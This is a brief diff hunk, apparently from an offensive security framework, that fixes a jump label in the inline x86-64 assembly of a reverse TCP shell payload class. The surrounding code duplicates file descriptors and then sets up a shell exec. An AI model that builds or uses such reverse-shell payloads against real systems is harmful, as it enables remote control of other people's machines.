@@ -69,7 +69,7 @@ class ShellReverseTCP(HatAsm, HatVenom, Consts):
 
             inc rsi
             cmp rsi, 2
-            jle loop
+            jle dup
 
             xor rax, rax
             mov rdi, 0x{self.shell.hex()}
